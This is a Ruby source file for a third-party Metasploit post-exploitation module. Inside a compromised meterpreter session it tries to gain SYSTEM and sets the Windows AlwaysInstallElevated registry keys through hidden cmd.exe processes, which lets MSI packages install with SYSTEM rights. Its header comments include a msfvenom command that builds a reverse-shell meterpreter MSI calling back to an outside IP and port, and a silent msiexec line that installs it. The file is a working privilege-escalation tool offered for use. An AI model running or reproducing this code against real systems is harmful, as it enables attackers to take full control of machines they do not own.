##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# MSI Install Privilege Escalation (registry).
# $Id$ 1.3 Author: r00t-3xp10it | SSA RedTeam @2016
# 'next time target machine restarts it will let us install .msi files as @SYSTEM'
# Credits: http://toshellandback.com/2015/11/24/ms-priv-esc/
#
#
# [ POST-EXPLOITATION MODULE DESCRIPTION ]
# This post-module checks for 'AlwaysInstallElevated' registry key settings in target machine and
# adds the requiered keys if they are not set/present. 'AlwaysInstallElevated' is a setting that
# allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI)
# with elevated (SYSTEM) permissions. 'REMARK: All changes will be active on next reboot.'
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on    => set SESSION 1
# Elevate session to 'nt authority/system'    => set GET_SYSTEM true
# Check/Elevate MSI files install permissions => set MSI_ESCALATION true
# Revert MSI install permissions to dword:0   => set REVERT_PRIVS true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/MSI_privilege_escalation.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/MSI_privilege_escalation.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ BUILD MSI PAYLOAD ]
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 --platform windows -f msi-nouac -o priv_escal.msi
#
# [ EXECUTE MSI PAYLOAD 'cmd terminal' ]
# msiexec /quiet /qn /i priv_escal.msi
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/MSI_privilege_escalation
# msf post(MSI_privilege_escalation) > info
# msf post(MSI_privilege_escalation) > show options
# msf post(MSI_privilege_escalation) > show advanced options
# msf post(MSI_privilege_escalation) > set [option(s)]
# msf post(MSI_privilege_escalation) > exploit
##






# -----------------------------------
# Module Dependencies
# -----------------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
 
 
 
# -------------------------------------
# Metasploit Class name and libs
# -------------------------------------
class MetasploitModule < Msf::Post
      Rank = GoodRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Registry

 
 
# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'MSI Install Privilege Escalation',
                        'Description'   => %q{

                                        This post-module checks for 'AlwaysInstallElevated' registry key settings in target machine and adds the requiered keys if they are not set/present. 'AlwaysInstallElevated' is a setting that allows non privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions. 'REMARK: All changes will be active on next reboot.'

                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net', # post-module author
                                        'inspiration: Ben Campbell | Parvez Anwar', # inspiration
                                        'bug hunter : Chaitanya [SSA RedTeam]' # module debug

                                ],
 
                        'Version'        => '$Revision: 1.3',
                        'DisclosureDate' => 'ago 22 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',
                        'Targets'        =>
                                [
                                         # Tested againts windows XP (SP3) | windows 7
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '1', # default its to run againts windows XP
                        'References'     =>
                                [
                                         [ 'URL', 'http://www.greyhathacker.net/?p=185' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'https://support.microsoft.com/en-us/kb/227181' ],
                                         [ 'URL', 'http://toshellandback.com/2015/11/24/ms-priv-esc/' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ],
                                         [ 'URL', 'http://msdn.microsoft.com/en-us/library/aa367561(VS.85).aspx' ]
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptBool.new('GET_SYSTEM', [ false, 'Elevate current session to nt authority/system' , false]),
                                OptBool.new('MSI_ESCALATION', [ false, 'Check/Elevate MSI files install permissions' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('REVERT_PRIVS', [ false, 'Revert MSI install permissions to dword:0' , false])
                        ], self.class)
 
        end


 


# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   sys = session.sys.config.sysinfo
   print_error("Operative System: #{sys['OS']}")
   print_error("This auxiliary only works against windows systems!")
   print_warning("Please execute [info] for further information...")
   print_line("")
   raise Rex::Script::Completed
end




# ----------------------------------------
# 'Privilege escalation' - Getting @SYSTEM
# ----------------------------------------
       def ls_getsys
             toor = []
             # variable API declarations
             toor = client.sys.config.getuid
             print_status("Client UID: #{toor}")
             print_status("Elevate client session to: nt authority/system")
             # getprivs API call loop funtion
             client.sys.config.getprivs.each do |priv|
             print_good(" Impersonate token => #{priv}")
       end
 
         # checking results (if_system)
         result = client.priv.getsystem
         if result and result[0]
 
                csuid = []
                csuid = client.sys.config.getuid
                # print results on screen if successefully executed
                print_status("Current client UID: #{csuid}")
                print_line("")

      else
      # error display in executing command
      print_error("Fail to obtain [nt authority/system] access!")
      print_error("Please manually run: getsystem to gain system privs!")
      end
 end




# -------------------------------------------------------
# 'Privilege escalation' - CHECK/SET REMOTE REGISTRY KEYS
# -------------------------------------------------------
def ls_stage1
  # list of arrays to be executed
  elevate = [
   'REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /f',
   'REG ADD HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /f',
   'REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f',
   'REG ADD HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f',
   'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True' # this key will refresh explorer.exe
  ]

  r=''
  install = "AlwaysInstallElevated"
  print_status("Checking [ HKLM ] remote regedit settings...")
  hklm = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer"
  # check 'AlwaysInstallElevated' registry keys settings on target
  local_machine_value = registry_getvaldata(hklm,install)

    if local_machine_value.nil? || local_machine_value == 0
      # 'AlwaysInstallElevated' registry key non existence (build required keys then)
      print_error("HKEY_LOCAL_MACHINE - '#{install}' does NOT exist or is SET to dword:0")
      print_warning("Setting '#{install}' remote requiered registry keys...")

        # registry keys loop funtion
        session.response_timeout=120 
        elevate.each do |evl|
        r = session.sys.process.execute("cmd.exe /c #{evl}", nil, {'Hidden' => true, 'Channelized' => true})
        print_good(" exec => #{evl}")

          # close client channel when done
          while(d = r.channel.read)
                  break if d == ""
          end
          r.channel.close
          r.close
        end

    else
      # 'AlwaysInstallElevated' remote registry keys are allready set to dword:1 (success!!!)
      print_status("HKEY_LOCAL_MACHINE - '#{install}' allready set to dword:#{local_machine_value}")
      print_warning("[REMARK]: Bypass its allready active. (no further need to change reg key data again)!")
      print_good(" Congratz, We are hable to install/run .MSI files with elevated 'SYSTEM' permissions...")
      print_line("")
      return
    end

# print display on screen
print_status("REMARK: next time target machine reboots it will let us install/run .MSI files with 'SYSTEM' permissions...")
print_line("")
end






# ---------------------------------------------------------------------
# REVERT 'AlwaysInstallElevated' REMOTE REGISTRY KEYS TO DEFAULT VALUES
# ---------------------------------------------------------------------
def ls_stage2
  # list of arrays to be executed
  revert = [
   'REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f',
   'REG ADD HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f',
   'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True' # this key will refresh explorer.exe
  ]
 
        r=''
        # executing list of arrays on target system and display info on screen
        print_status("Revert 'AlwaysInstallElevated' registry keys to dword:0 (default)")
        print_warning("Setting remote requiered registry keys...")
        session.response_timeout=120
        revert.each do |rev|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{rev}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_good(" exec => #{rev}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 # error exception funtion
                 rescue ::Exception => e
                  print_error("Error Running Command: #{e.class} #{e}")
                  print_warning("Try to rise meterpreter session to [nt authority/system] before runing this module")
                end
        end
        # print display on screen
        print_status("Job done, 'AlwaysInstallElevated' registry keys changed to default values...")
        print_line("")
 end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd

    # Print banner and scan results on screen
    print_line("    +-----------------------------------------+")
    print_line("    |   * MSI Install Privilege Escalation *  |")
    print_line("    |   Author: Pedro Ubuntu [ r00t-3xp10it ] |")
    print_line("    +-----------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    # check for proper session.
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['GET_SYSTEM']
         ls_getsys
      end

      if datastore['MSI_ESCALATION']
         ls_stage1
      end

      if datastore['REVERT_PRIVS']
         ls_stage2
      end
   end
end
